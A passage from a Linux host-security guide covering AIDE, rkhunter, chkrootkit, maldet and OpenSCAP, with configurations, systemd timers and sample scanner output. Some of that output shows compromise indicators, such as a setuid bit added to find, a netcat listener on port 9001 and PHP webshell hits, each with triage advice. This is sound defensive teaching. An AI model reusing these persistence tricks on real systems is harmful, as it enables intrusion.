`chattr +i` is a speed bump (root can `chattr -i`), but the `-w /var/lib/aide/` audit watch turns removing the immutable flag into a high-fidelity alert. The S3 copy with a bucket policy that denies `DeleteObject` and `PutObject` overwrite to the node's role is the actual control.

**A check that found something:**

```
$ sudo aide --check
Start timestamp: 2026-08-24 04:00:07 -0300 (AIDE 0.18.6)
AIDE found differences between database and filesystem!!

Summary:
  Total number of entries:	68941
  Added entries:		1
  Removed entries:		0
  Changed entries:		2

---------------------------------------------------
Added entries:
---------------------------------------------------

f+++++++++++++++++: /usr/local/sbin/nc.traditional

---------------------------------------------------
Changed entries:
---------------------------------------------------

f  ...    .C... .. : /etc/ssh/sshd_config
f  ..p... .C... .. : /usr/bin/find

---------------------------------------------------
Detailed information about changes:
---------------------------------------------------

File: /etc/ssh/sshd_config
  SHA512   : lSdOWQCTUnr3fh8w3B5UZfhcYcVdBGLl | 8QcVQxHhBsnDZ0Yt4mNU1cRXJk0oT2ap
             pQe1V3lVwn8nJ0mzYQGdlA==        | bR7yWmC0lQvE9ZlqCUiWzw==
  Ctime    : 2026-06-02 10:12:44 -0300        | 2026-08-24 03:58:11 -0300
  Size     : 3907                             | 3971

File: /usr/bin/find
  Perm     : -rwxr-xr-x                       | -rwsr-xr-x
  SHA512   : Dq0kT7mVXbC1nJ5Yg2LpQeR8sW3xZaHu | Dq0kT7mVXbC1nJ5Yg2LpQeR8sW3xZaHu
             kM4vN6oP8rS0tU2wX4yZ6A==         | kM4vN6oP8rS0tU2wX4yZ6A==
  Ctime    : 2026-05-30 07:22:05 -0300        | 2026-08-24 03:59:02 -0300

End timestamp: 2026-08-24 04:06:11 -0300 (run time: 6m 4s)
```

Triage in order of severity: `/usr/bin/find` gained the **setuid bit with an unchanged hash** — that is a textbook privilege-escalation persistence primitive, and it is unambiguous. `sshd_config` changed content and grew by 64 bytes. A new statically linked netcat appeared in `/usr/local/sbin`. Now pivot straight to the audit trail for attribution:

```
$ sudo ausearch -k perm_mod -i -ts 04:00 | grep -A2 'name=/usr/bin/find'
$ sudo ausearch -f /usr/local/sbin/nc.traditional -i
```

The interplay is the whole point: **AIDE tells you *what* changed; `auditd` tells you *who* and *how*.** Neither is sufficient alone.

**Accepting legitimate change:**

```
$ sudo aide --update
$ sudo mv /var/lib/aide/aide.db.new.gz /var/lib/aide/aide.db.gz
```

`--update` performs a check *and* writes the new database in one pass. **Never run it from cron.** An automatic `--update` means the first thing your FIM does after a compromise is bless the compromise. The correct workflow is: change management approves → operator reviews the diff → operator re-baselines explicitly.

### 3.5 FIM comparison

| | AIDE | Tripwire (OSS) | Samhain | osquery + FIM | `auditd` watches | IMA/EVM |
|---|---|---|---|---|---|---|
| Model | Offline snapshot diff | Offline snapshot diff | Agent + central server | Query engine, `inotify` events | Kernel real-time | Kernel appraisal at open/exec |
| Detection latency | Scan interval (hours) | Scan interval | Near real-time | Near real-time | **Real-time** | **Blocking, pre-execution** |
| Baseline protection | External copy + GPG (manual) | Site/local key signing (built-in) | Central server + stealth mode | Central server | N/A (no baseline) | Kernel keyring, TPM-sealed |
| Coverage of *content* | Digest of every selected file | Same | Same | Hash on event | **None** — records access, not content | Full, enforced |
| Cost of full scan | High I/O for hours | High | Moderate (incremental) | Moderate | Zero | Amortised per open |
| Can it *prevent*? | No | No | No | No | No | **Yes** (`appraise` mode) |
| Packaged in every distro | **Yes** | Mostly | Sometimes | Third-party repo | **Yes** | Kernel-native, config-heavy |
| In 303-300 objectives | **Yes** | No | No | No | Yes | No |

For a fleet, the pragmatic layering is: IMA/EVM or dm-verity where the platform supports it (immutable OS images make this nearly free), AIDE on the mutable trees for compliance evidence, `auditd` watches for real-time attribution.

---

## 4. Rootkit detection: `chkrootkit` and `rkhunter`

### 4.1 What they can and cannot do

Both are **userspace, signature-plus-heuristic** scanners. They look for known rootkit artefacts (file names, strings, ports), and for *inconsistencies* that indicate hiding. Their limitation is structural: a kernel-mode rootkit that hooks `getdents64` lies to the scanner exactly as it lies to `ls`. They detect the competent-but-not-expert attacker, and they detect leftovers. They do not detect a well-engineered LKM implant.

Their real production value is the **file-property database**: `rkhunter` maintains hashes and inode/permission metadata for hundreds of system binaries, which is a lightweight FIM for exactly the files attackers replace.

### 4.2 `chkrootkit`

```
$ sudo chkrootkit -q
Checking `bindshell'... INFECTED (PORTS:  465)
eth0: PACKET SNIFFER(/usr/sbin/tcpdump[2211])
Checking `lkm'... You have     2 process hidden for readdir command
You have    2 process hidden for ps command
chkproc: Warning: Possible LKM Trojan installed
```

Interpreting this correctly separates the engineer from the alert-forwarder:

- `bindshell ... PORTS: 465` is the classic false positive: TCP/465 is SMTPS. Confirm with `ss -lntp | grep :465` and identify the process.
- `PACKET SNIFFER(/usr/sbin/tcpdump[2211])` is a real promiscuous-interface report — legitimate if someone is debugging, an incident otherwise. Correlate with `ausearch -m ANOM_PROMISCUOUS`.
- `chkproc: Possible LKM Trojan installed` compares `ps` output against `/proc` directly. **On a container host this fires constantly** because of PID namespaces and short-lived processes racing the two enumerations. Re-run to confirm; a genuine finding is stable across runs.

Useful flags:

```
$ sudo chkrootkit -x | less            # expert mode: raw strings output, no verdict
$ sudo chkrootkit -p /mnt/trusted/bin  # use known-good binaries, not the host's
$ sudo chkrootkit -r /mnt/victim       # offline scan of a mounted image
$ sudo chkrootkit -n                   # skip NFS-mounted directories
$ sudo chkrootkit -e '/var/lib/containers /var/lib/docker'
```

`-p` and `-r` together are the only trustworthy way to run it: boot rescue media, mount the suspect root read-only, scan it with the rescue system's binaries. Scanning a live compromised host with its own `ps`, `netstat` and `ls` is asking the suspect to audit itself.

### 4.3 `rkhunter`

`/etc/rkhunter.conf.local` (never edit `rkhunter.conf` directly — it is package-owned and will be overwritten):

```ini
# --- Update sources ---------------------------------------------------
UPDATE_MIRRORS=1
MIRRORS_MODE=0
WEB_CMD=""                      # empty = use rkhunter's internal downloader.
                                # Debian sets this to /bin/false by default,
                                # which silently breaks --update.

# --- File property database -------------------------------------------
# Use the package manager as the source of truth for expected hashes.
# RPM | DPKG | BSD | SOLARIS | NONE
PKGMGR=DPKG
HASH_FUNC=SHA512
HASH_CMD=SHA512

# --- Test selection ---------------------------------------------------
ENABLE_TESTS=ALL
DISABLE_TESTS=suspscan hidden_ports deleted_files apps
# suspscan: extremely noisy heuristic string scan; high FP on web servers.
# deleted_files: fires on every daemon holding a deleted log after logrotate.

# --- Known-good exceptions (each one is a documented risk acceptance) --
SCRIPTWHITELIST=/usr/bin/egrep
SCRIPTWHITELIST=/usr/bin/fgrep
SCRIPTWHITELIST=/usr/bin/which
SCRIPTWHITELIST=/usr/bin/ldd
ALLOWHIDDENDIR=/etc/.java
ALLOWHIDDENDIR=/dev/.lxc
ALLOWHIDDENFILE=/usr/share/man/man1/..1.gz
ALLOWDEVFILE=/dev/shm/pulse-shm-*
ALLOWPROCLISTEN=/usr/sbin/chronyd
ALLOWIPCPROC=/usr/lib/systemd/systemd-journald

# --- Reporting --------------------------------------------------------
MAIL-ON-WARNING=sec-oncall@example.net
MAIL_CMD=mail -s "[rkhunter] warnings on ${HOST_NAME}"
COPY_LOG_ON_ERROR=1
USE_SYSLOG=authpriv.notice
AUTO_X_DETECT=1
ALLOW_SSH_ROOT_USER=no
ALLOW_SSH_PROT_V1=0

# --- Cron behaviour ---------------------------------------------------
CRON_DAILY_RUN="true"
CRON_DB_UPDATE="true"
APT_AUTOGEN="yes"               # Debian: refresh properties after apt runs
```

**Operating sequence:**

```
$ sudo rkhunter --versioncheck
[ Rootkit Hunter version 1.4.6 ]
Checking rkhunter version...
  This version  : 1.4.6
  Latest version: 1.4.6

$ sudo rkhunter --update
[ Rootkit Hunter version 1.4.6 ]
Checking rkhunter data files...
  Checking file mirrors.dat                                  [ No update ]
  Checking file programs_bad.dat                             [ Updated ]
  Checking file backdoorports.dat                            [ No update ]
  Checking file suspscan.dat                                 [ No update ]
  Checking file i18n/cn                                      [ No update ]
  Checking file i18n/en                                      [ Updated ]

$ sudo rkhunter --propupd
[ Rootkit Hunter version 1.4.6 ]
File updated: searched for 178 files, found 143
```

**`--propupd` is the dangerous one.** It says "whatever is on disk right now is correct" and rewrites `/var/lib/rkhunter/db/rkhunter.dat`. Running it on a compromised host permanently blesses the trojaned binaries. The policy is:

- Run `--propupd` **only** immediately after a package transaction you initiated, on a host you believe clean.
- Wire it to the package manager (`APT_AUTOGEN=yes`, or a `dnf` post-transaction hook), never to a schedule.
- Add `-w /var/lib/rkhunter/db/ -p wa -k rkhunter_db` (already in the rule set above) so a `--propupd` you did not authorise is itself an alert.

**A check:**

```
$ sudo rkhunter --check --sk --rwo
Warning: The file properties have changed:
         File: /usr/bin/curl
         Current hash: 7d1a4c9f3e2b8a56d0c4f19e7b3a2d85c6e1f04a9b7d3c2e5a8f61b0d4c9e73f
         Stored hash : 2f9e0b7a4c3d1568e9a2b7c4d0f3e816a5b9c2d7e4f108a3b6c9d0e2f5a7b134
         Current inode: 1180436    Stored inode: 1180101
         Current file modification time: 2026-08-19 11:04:12
         Stored file modification time : 2026-05-30 07:22:05
Warning: Hidden directory found: /usr/share/.tmp
Warning: Process '/usr/local/sbin/nc.traditional' (PID 24917) is listening on
         network interface 0.0.0.0:9001.
Warning: SSH configuration option 'PermitRootLogin' has not been set to 'no'.

$ echo $?
1
```

Flags: `--sk`/`--skip-keypress` (required for non-interactive), `--rwo`/`--report-warnings-only` (cron-friendly), `--cronjob` (implies `--sk --rwo --nocolors`), `--enable`/`--disable` to select tests, `--list tests|rootkits|propfiles`, `-l <file>` to redirect the log (default `/var/log/rkhunter.log`).

The `curl` warning is almost certainly the August security update — verify rather than assume:

```
$ dpkg -V curl ; echo "dpkg verify rc=$?"
dpkg verify rc=0
$ apt-get changelog curl 2>/dev/null | head -3
curl (8.5.0-2ubuntu10.6) noble-security; urgency=medium
  * SECURITY UPDATE: use-after-free in the SSL session cache
$ sudo ausearch -k exec -i -ts 08/19/2026 | grep -m1 'comm="dpkg"'
```

Three independent confirmations — package DB verifies, changelog matches the date, audit shows `dpkg` ran at that time — and the finding is closed as a legitimate update. Then, and only then, `rkhunter --propupd`.

### 4.4 Scanner comparison

| Aspect | `chkrootkit` | `rkhunter` |
|---|---|---|
| Language | C + shell | Pure shell (highly portable) |
| Signature updates | Ships with releases only | `--update` from mirrors (`mirrors.dat`) |
| File-property baseline | No | **Yes** (`/var/lib/rkhunter/db/rkhunter.dat`) |
| Package-manager integration | No | `PKGMGR=RPM\|DPKG\|BSD\|SOLARIS` |
| Config granularity | Command-line flags only | Extensive `rkhunter.conf` + `.local` |
| Offline/rescue scanning | `-r <rootdir>` and `-p <path>` | Limited |
| Config-hardening checks (SSH, etc.) | No | Yes |
| Signal-to-noise on container hosts | Poor (`chkproc` races) | Moderate with tuning |
| Typical runtime | seconds–1 min | 1–4 min |

Run both. They overlap on known rootkits but diverge on methodology, and the cost of running the second one is a minute of CPU on a schedule.

---

## 5. Linux Malware Detect (`maldet`)

### 5.1 Where it fits

LMD (Linux Malware Detect, R-fx Networks) targets a threat the previous tools ignore: **malicious content uploaded into data directories** — PHP webshells, cryptominer droppers, obfuscated backdoors in `wp-content/uploads`. Rootkit scanners look at system binaries; AIDE excludes volatile data trees for cost reasons; LMD scans exactly the trees they both skip.

Its signature set is curated from network-edge intrusion data, honeypots, and community submissions, and it can drive the ClamAV engine (`clamscan`) with those signatures — you get ClamAV's fast, well-tested matcher with LMD's Linux-server-relevant signatures.

### 5.2 Installation and configuration

```
$ cd /usr/local/src
$ curl -fsSLO https://www.rfxn.com/downloads/maldetect-current.tar.gz
$ curl -fsSLO https://www.rfxn.com/downloads/maldetect-current.tar.gz.sha256
$ sha256sum -c maldetect-current.tar.gz.sha256
maldetect-current.tar.gz: OK
$ tar -xzf maldetect-current.tar.gz && cd maldetect-*
$ sudo ./install.sh
Linux Malware Detect v1.6.5
            (C) 2002-2025, R-fx Networks <proj@rfxn.com>

installation completed to /usr/local/maldetect
config file: /usr/local/maldetect/conf.maldet
exec file: /usr/local/maldetect/maldet
exec link: /usr/local/sbin/maldet
exec link: /usr/local/sbin/lmd
cron.daily: /etc/cron.daily/maldet
```

`/usr/local/maldetect/conf.maldet`:

```bash
# ---- Alerting --------------------------------------------------------
email_alert="1"
email_addr="sec-oncall@example.net"
email_ignore_clean="1"          # only mail when there are hits

# ---- Quarantine ------------------------------------------------------
quarantine_hits="1"             # move hits to quarantine automatically
quarantine_clean="0"            # do NOT attempt to clean injected files:
                                # a "cleaned" file is evidence you destroyed
quarantine_suspend_user="0"     # shared hosting only; on a k8s node this
                                # suspends a system account and breaks the node
quarantine_suspend_user_minuid="500"

# ---- Scan behaviour --------------------------------------------------
scan_max_depth="15"
scan_min_filesize="24"
scan_max_filesize="2048k"       # webshells are small; raising this costs hours
scan_hexdepth="1024"
scan_hexfifo="0"
scan_clamscan="1"               # use the ClamAV engine if clamscan exists
scan_user_access="0"
scan_ignore_root="0"
scan_cpunice="19"
scan_ionice="6"
scan_tmpdir="/var/tmp"

# ---- inotify real-time monitoring -----------------------------------
inotify_base_watches="80000"    # must be <= fs.inotify.max_user_watches
inotify_sleep="15"
inotify_stime="30"
inotify_webdir="/var/www"
inotify_docroot="public_html"
inotify_min_uid="500"

# ---- Updates ---------------------------------------------------------
autoupdate_signatures="1"
autoupdate_version="0"          # pin the binary; update it via change control
autoupdate_version_hashed="1"
```

Exclusions in `/usr/local/maldetect/ignore_paths`:

```
/var/lib/containerd
/var/lib/docker/overlay2
/var/lib/kubelet/pods
/proc
/sys
/usr/local/maldetect/quarantine
/var/www/html/vendor/phpunit          # known FP: eval() in test harnesses
```

### 5.3 Scanning and real-time monitoring

```
$ sudo maldet -u
Linux Malware Detect v1.6.5
maldet(31401): {sigup} performing signature update check...
maldet(31401): {sigup} local signature set is version 202503271142
maldet(31401): {sigup} new signature set (202508211603) available
maldet(31401): {sigup} downloading https://cdn.rfxn.com/downloads/maldet-sigpack.tgz
maldet(31401): {sigup} verified md5sum of maldet-sigpack.tgz
maldet(31401): {sigup} unpacked and installed maldet-sigpack.tgz
maldet(31401): {sigup} signature set update completed
maldet(31401): {sigup} 17472 signatures (14907 MD5 | 2117 HEX | 448 YARA | 0 USER)

$ sudo maldet -a /var/www/html
Linux Malware Detect v1.6.5
maldet(2841): {scan} signatures loaded: 17472 (14907 MD5 | 2117 HEX | 448 YARA | 0 USER)
maldet(2841): {scan} building file list for /var/www/html, this might take awhile...
maldet(2841): {scan} setting nice priority to 19 and ionice to 6
maldet(2841): {scan} file list completed in 4s, found 18422 files...
maldet(2841): {scan} found clamav binary at /usr/bin/clamscan, using clamav scanner engine...
maldet(2841): {scan} scan of /var/www/html (18422 files) in progress...
maldet(2841): {scan} 18422/18422 files scanned: 2 hits 2 quarantined
maldet(2841): {scan} scan completed on /var/www/html: files 18422, malware hits 2, cleaned hits 0, time 214s
maldet(2841): {scan} scan report saved, to view run: maldet --report 260824-0412.2841

$ sudo maldet --report 260824-0412.2841
malware detect scan report for web-07.example.net:
SCAN ID: 260824-0412.2841
TIME: Aug 24 04:15:46 -0300
PATH: /var/www/html
TOTAL FILES: 18422
TOTAL HITS: 2
TOTAL CLEANED: 0

FILE HIT LIST:
{HEX}php.base64.v23qtp.216 : /var/www/html/wp-content/uploads/2026/07/thumb_x.php
 => /usr/local/maldetect/quarantine/thumb_x.php.28417
{YARA}php_webshell_generic : /var/www/html/wp-includes/class-wp-cache-init.php
 => /usr/local/maldetect/quarantine/class-wp-cache-init.php.28418
===============================================
Linux Malware Detect v1.6.5 < proj@rfxn.com >
```

`class-wp-cache-init.php` inside `wp-includes/` is the interesting one: legitimate WordPress core files are known and versioned, so a core-directory file that is not in the core manifest is an implant, not a false positive.

**Real-time monitoring:**

```
$ sudo sysctl -w fs.inotify.max_user_watches=524288
fs.inotify.max_user_watches = 524288
$ echo 'fs.inotify.max_user_watches = 524288' | sudo tee /etc/sysctl.d/60-maldet.conf

$ sudo maldet --monitor /var/www,/srv/uploads
Linux Malware Detect v1.6.5
maldet(31980): {mon} added /var/www to inotify monitoring array
maldet(31980): {mon} added /srv/uploads to inotify monitoring array
maldet(31980): {mon} starting inotify process on 2 paths, this might take awhile...
maldet(31980): {mon} inotify startup successful (pid: 31994)
maldet(31980): {mon} inotify monitoring log: /usr/local/maldetect/logs/inotify_log
```

Watches are per-inode and consume non-swappable kernel memory (~1 KiB each). Monitoring a tree with 500 000 files costs roughly half a gigabyte and takes minutes to arm. Monitor the **upload directories**, never the whole filesystem.

Restoring a false positive from quarantine:

```
$ sudo maldet --restore class-wp-cache-init.php.28418
maldet(32101): {restore} restored /usr/local/maldetect/quarantine/class-wp-cache-init.php.28418
                       => /var/www/html/wp-includes/class-wp-cache-init.php
```

`quarantine_clean="0"` matters here: cleaning modifies the file in place, destroying the artefact your IR team needs and leaving you unable to prove what the injected code did.

### 5.4 Where LMD does and does not belong

| Environment | Verdict |
|---|---|
| Shared hosting / multi-tenant web with user uploads | **High value** — this is the design target |
| CMS-based public web (WordPress, Drupal, Magento) | **High value** — webshell signatures are directly relevant |
| Mail relay / file-transfer gateway | Useful, paired with ClamAV daemon mode |
| Kubernetes worker node | **Low value, high cost** — container layers churn constantly, and the correct control is image scanning in CI plus an immutable, read-only root filesystem |
| Database / cache tier | No value; the data is not executable content |

---

## 6. OpenSCAP: configuration compliance as a measurable property

### 6.1 The SCAP component model

SCAP is a NIST-maintained suite of interoperable specifications. The pieces you actually touch:

| Component | Full name | Role |
|---|---|---|
| **XCCDF** | Extensible Configuration Checklist Description Format | The human-facing checklist: rules, profiles, severities, remediation text |
| **OVAL** | Open Vulnerability and Assessment Language | The machine-facing *test*: "is `PermitRootLogin` set to `no` in `/etc/ssh/sshd_config`?" |
| **CPE** | Common Platform Enumeration | Platform applicability — stops RHEL rules from evaluating on Debian |
| **OCIL** | Open Checklist Interactive Language | Questions a machine cannot answer (physical/procedural) |
| **CVE / CVSS / CCE** | Identifiers | CVE = vulnerability, CCE = configuration control, CVSS = severity score |
| **SDS** | Source DataStream | One XML bundling XCCDF + OVAL + CPE — what `ssg-*-ds.xml` is |
| **ARF** | Asset Reporting Format | The results bundle: what was evaluated, on what asset, with what outcome |
| **Tailoring** | XCCDF tailoring file | Your deviations from a stock profile, kept separately from vendor content |

`oscap` is the scanner; **SCAP Security Guide** (ComplianceAsCode) is the content. Content is per-OS-major-version and must match the host.

### 6.2 Discovery and evaluation

```
$ sudo dnf install -y openscap-scanner scap-security-guide
$ ls /usr/share/xml/scap/ssg/content/
ssg-rhel9-ds-1.2.xml  ssg-rhel9-ds.xml  ssg-rhel9-xccdf.xml  ssg-rhel9-oval.xml
ssg-rhel9-cpe-dictionary.xml  ssg-rhel9-ocil.xml

$ oscap info /usr/share/xml/scap/ssg/content/ssg-rhel9-ds.xml
Document type: Source Data Stream
Imported: 2026-07-14T09:12:03

Stream: scap_org.open-scap_datastream_from_xccdf_ssg-rhel9-xccdf.xml
Generated: (null)
Version: 1.3
Checklists:
	Ref-Id: scap_org.open-scap_cref_ssg-rhel9-xccdf.xml
		Status: draft
		Generated: 2026-07-14
		Resolved: true
		Profiles:
			Title: ANSSI-BP-028 (enhanced)
				Id: xccdf_org.ssgproject.content_profile_anssi_bp28_enhanced
			Title: CIS Red Hat Enterprise Linux 9 Benchmark for Level 1 - Server
				Id: xccdf_org.ssgproject.content_profile_cis_server_l1
			Title: CIS Red Hat Enterprise Linux 9 Benchmark for Level 2 - Server
				Id: xccdf_org.ssgproject.content_profile_cis
			Title: DISA STIG for Red Hat Enterprise Linux 9
				Id: xccdf_org.ssgproject.content_profile_stig
			Title: PCI-DSS v4.0 Control Baseline for RHEL 9
				Id: xccdf_org.ssgproject.content_profile_pci-dss
			Title: Health Insurance Portability and Accountability Act (HIPAA)
				Id: xccdf_org.ssgproject.content_profile_hipaa
		Referenced check files:
			ssg-rhel9-oval.xml
				system: http://oval.mitre.org/XMLSchema/oval-definitions-5
Checks:
	Ref-Id: scap_org.open-scap_cref_ssg-rhel9-oval.xml
Dictionaries:
	Ref-Id: scap_org.open-scap_cref_ssg-rhel9-cpe-dictionary.xml
```

**Evaluate a profile:**

```
$ sudo oscap xccdf eval \
      --profile xccdf_org.ssgproject.content_profile_cis_server_l1 \
      --results-arf /var/lib/oscap/arf-$(hostname -s)-$(date +%F).xml \
      --report /var/lib/oscap/report-$(hostname -s)-$(date +%F).html \
      --oval-results \
      /usr/share/xml/scap/ssg/content/ssg-rhel9-ds.xml

Title   Ensure Rsyslog Is Installed
Rule    xccdf_org.ssgproject.content_rule_package_rsyslog_installed
Ident   CCE-83967-8
Result  pass

Title   Enable auditd Service
Rule    xccdf_org.ssgproject.content_rule_service_auditd_enabled
Ident   CCE-83787-0
Result  pass

Title   Record Attempts to Alter Logon and Logout Events - faillock
Rule    xccdf_org.ssgproject.content_rule_audit_rules_login_events_faillock
Ident   CCE-83653-4
Result  fail

Title   Install AIDE
Rule    xccdf_org.ssgproject.content_rule_package_aide_installed
Ident   CCE-83437-2
Result  pass

Title   Configure Periodic Execution of AIDE
Rule    xccdf_org.ssgproject.content_rule_aide_periodic_cron_checking
Ident   CCE-83438-0
Result  fail

Title   Disable SSH Root Login
Rule    xccdf_org.ssgproject.content_rule_sshd_disable_root_login
Ident   CCE-83363-0
Result  fail

Title   Ensure /tmp Located On Separate Partition
Rule    xccdf_org.ssgproject.content_rule_partition_for_tmp
Ident   CCE-83862-1
Result  notapplicable

$ echo $?
2
```

**Exit codes are the automation contract:** `0` = every rule passed, `1` = the scanner itself errored (bad content, unreadable file, wrong platform), `2` = at least one rule failed. A CI gate must distinguish `1` from `2`; treating both as "failed" hides broken tooling behind expected policy failures.

**Extract a machine-readable summary from the ARF:**

```
$ oscap xccdf generate report /var/lib/oscap/arf-web-07-2026-08-24.xml > /tmp/r.html
$ xmllint --xpath 'count(//*[local-name()="rule-result"][*[local-name()="result"]="fail"])' \
      /var/lib/oscap/arf-web-07-2026-08-24.xml
41
```

### 6.3 Tailoring: deviating from a benchmark without forking it

Never edit vendor content. Express deviations in a tailoring file so profile updates keep working:

```
$ sudo dnf install -y openscap-utils
$ autotailor \
      --title "CIS L1 Server — example.net Kubernetes workers" \
      --id-namespace net.example \
      --profile xccdf_org.ssgproject.content_profile_cis_server_l1 \
      --unselect-rule xccdf_org.ssgproject.content_rule_partition_for_tmp \
      --unselect-rule xccdf_org.ssgproject.content_rule_package_nftables_installed \
      --var-value var_password_pam_minlen=16 \
      --var-value var_accounts_maximum_age_login_defs=90 \
      --var-value var_auditd_space_left_percentage=15 \
      --output /etc/oscap/tailoring-k8s-worker.xml \
      /usr/share/xml/scap/ssg/content/ssg-rhel9-ds.xml

$ sudo oscap xccdf eval \
      --tailoring-file /etc/oscap/tailoring-k8s-worker.xml \
      --profile xccdf_net.example_profile_cis_server_l1_customized \
      --results-arf /var/lib/oscap/arf-tailored.xml \
      /usr/share/xml/scap/ssg/content/ssg-rhel9-ds.xml
```

Every `--unselect-rule` is a documented risk acceptance. `partition_for_tmp` is unselected here because the node uses an immutable OS image with `/tmp` on tmpfs; `nftables_installed` because the CNI manages `iptables-nft` directly. Put the justification in the commit message — the auditor will ask.

### 6.4 Remediation: generate, review, apply

```
$ sudo oscap xccdf generate fix \
      --fix-type ansible \
      --profile xccdf_org.ssgproject.content_profile_cis_server_l1 \
      --result-id "" \
      --output /tmp/remediate-cis-l1.yml \
      /usr/share/xml/scap/ssg/content/ssg-rhel9-ds.xml

$ head -25 /tmp/remediate-cis-l1.yml
---
 - hosts: all
   vars:
     var_password_pam_minlen: !!str 14
     var_accounts_maximum_age_login_defs: !!str 365
   tasks:
     - name: Ensure aide is installed
       package:
         name: aide
         state: present
       when: ansible_virtualization_role != "guest" or ansible_virtualization_type != "docker"
       tags:
         - package_aide_installed
         - medium_severity
         - enable_strategy
         - low_complexity
         - low_disruption
         - CCE-83437-2
         - NIST-800-53-CM-6(a)
         - PCI-DSSv4-11.5.2
```

Generate a **fix from a specific result set** (only the rules that actually failed on this host) instead of the whole profile:

```
$ sudo oscap xccdf generate fix \
      --fix-type bash \
      --result-id "" \
      --output /tmp/fix-web-07.sh \
      /var/lib/oscap/arf-web-07-2026-08-24.xml
```

`--remediate` applies fixes inline during evaluation:

```
$ sudo oscap xccdf eval --remediate \
      --profile xccdf_org.ssgproject.content_profile_cis_server_l1 \
      --results-arf /var/lib/oscap/arf-post-remediation.xml \
      /usr/share/xml/scap/ssg/content/ssg-rhel9-ds.xml
```

**Do not run `--remediate` unattended on production.** STIG/CIS remediations reconfigure PAM, SSH, firewall and mount options. A rule that disables an "unnecessary" kernel module can drop a node's storage path; a PAM rule that enforces `pam_faillock` can lock out the break-glass account. The safe pipeline is: evaluate in production → generate the Ansible fix → apply and validate in staging → promote through change control.

### 6.5 Container and remote scanning

```
$ sudo oscap-podman registry.example.net/base/rhel9:2026.08 xccdf eval \
      --profile xccdf_org.ssgproject.content_profile_cis_server_l1 \
      --report /tmp/image-report.html \
      /usr/share/xml/scap/ssg/content/ssg-rhel9-ds.xml

$ oscap-ssh sre-oncall@web-07.example.net 22 xccdf eval \
      --profile xccdf_org.ssgproject.content_profile_stig \
      --report /tmp/web-07-stig.html \
      /usr/share/xml/scap/ssg/content/ssg-rhel9-ds.xml
```

`oscap-ssh` copies the content over, runs the scan remotely and retrieves the results — no scanner install on the target, which is exactly right for immutable-image fleets.

**Vulnerability (CVE) scanning is a different mode** — OVAL definitions published by the distro vendor, not an XCCDF checklist:

```
$ curl -fsSLO https://security.access.redhat.com/data/oval/v2/RHEL9/rhel-9.oval.xml.bz2
$ bunzip2 rhel-9.oval.xml.bz2
$ oscap oval eval --report /tmp/vuln-report.html rhel-9.oval.xml
Definition oval:com.redhat.rhsa:def:20265412: true
Definition oval:com.redhat.rhsa:def:20265388: false
Definition oval:com.redhat.rhsa:def:20265301: true
...
Evaluation done.
```

`true` means the definition **matched** — the host is vulnerable. This inverts the intuition from XCCDF, where `pass` is good. Read the report, not the raw booleans.

### 6.6 Compliance-tool trade-offs

| | OpenSCAP | Ansible role (e.g. `RHEL9-CIS`) | Chef InSpec | Vendor CSPM agent |
|---|---|---|---|---|
| Standard | NIST SCAP 1.3, machine-readable | None (repo convention) | Custom DSL | Proprietary |
| Auditor acceptance | **Highest** — ARF is a recognised artefact | Requires explanation | Moderate | Vendor-attested |
| Assess vs enforce | Assess by default, `--remediate` optional | Enforce by default | Assess only | Both |
| Content maintenance | Distro-maintained (ComplianceAsCode) | Community | You write it | Vendor |
| Offline / air-gapped | **Yes**, content is a local file | Yes | Yes | Usually no |
| Cost | Free, in-distro | Free | Free/paid tiers | Per-node licence |
| Drift over time | Re-run on a timer, diff ARFs | Convergence run | Re-run | Continuous |

The mature pattern: **OpenSCAP measures, Ansible enforces.** Keep the assessor and the enforcer separate, or the tool that says "compliant" is the same tool that decided what compliant means.

---

## 7. Automation and fleet infrastructure

### 7.1 systemd timers (preferred over cron)

Timers give you dependency ordering, per-unit sandboxing, `RandomizedDelaySec` (essential — 4 000 nodes hashing `/usr` at 04:00 will saturate shared storage), `Persistent=true` for missed runs, and journald capture of output.

`/etc/systemd/system/aide-check.service`:

```ini
[Unit]
Description=AIDE file integrity check
Documentation=man:aide(1)
After=network-online.target auditd.service
Wants=network-online.target
ConditionPathExists=/var/lib/aide/aide.db.gz

[Service]
Type=oneshot
Nice=19
IOSchedulingClass=idle
CPUSchedulingPolicy=idle
TimeoutStartSec=3h

ExecStart=/usr/sbin/aide --config /etc/aide.conf --check
# Exit codes: 0 = no change; 1/2/4 = added/removed/changed entries;
# >=14 = real errors. Map the "differences found" codes to success so the unit
# is not marked failed, and let the report itself drive the alert.
SuccessExitStatus=0 1 2 3 4 5 6 7
ExecStopPost=/usr/local/sbin/aide-report-ship.sh

# Sandbox: the checker needs to read everything and write almost nothing.
ProtectSystem=strict
ReadWritePaths=/var/log/aide /var/lib/aide
ProtectHome=read-only
PrivateTmp=yes
PrivateDevices=yes
NoNewPrivileges=yes
ProtectKernelTunables=yes
ProtectKernelModules=yes
ProtectControlGroups=yes
RestrictRealtime=yes
RestrictSUIDSGID=yes
LockPersonality=yes
MemoryDenyWriteExecute=yes
SystemCallFilter=@system-service
SystemCallErrorNumber=EPERM
CapabilityBoundingSet=CAP_DAC_READ_SEARCH CAP_FOWNER

[Install]
WantedBy=multi-user.target
```

`/etc/systemd/system/aide-check.timer`:

```ini
[Unit]
Description=Daily AIDE file integrity check
Documentation=man:aide(1)

[Timer]
OnCalendar=*-*-* 03:30:00
RandomizedDelaySec=2h
Persistent=true
AccuracySec=1min
Unit=aide-check.service

[Install]
WantedBy=timers.target
```

`/etc/systemd/system/security-scan.service` (rootkit scanners in one unit):

```ini
[Unit]
Description=Rootkit and malware scan (rkhunter, chkrootkit, maldet)
After=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
Nice=19
IOSchedulingClass=idle
TimeoutStartSec=2h

ExecStartPre=-/usr/bin/rkhunter --update --nocolors
ExecStart=-/usr/bin/rkhunter --cronjob --report-warnings-only --nocolors
ExecStart=-/usr/sbin/chkrootkit -q -e '/var/lib/containers /var/lib/kubelet'
ExecStart=-/usr/local/sbin/maldet -b -u
ExecStart=-/usr/local/sbin/maldet -b -r /var/www 2
ExecStopPost=/usr/local/sbin/security-scan-ship.sh

PrivateTmp=yes
NoNewPrivileges=yes
ProtectHome=read-only

[Install]
WantedBy=multi-user.target
```

The leading `-` on each `ExecStart` means "a non-zero exit does not abort the remaining commands" — `rkhunter` exits `1` whenever it reports a warning, and without the `-` the `chkrootkit` and `maldet` scans would never run on exactly the days you most need them.

`/etc/systemd/system/security-scan.timer`:

```ini
[Unit]
Description=Daily rootkit and malware scan

[Timer]
OnCalendar=*-*-* 04:00:00
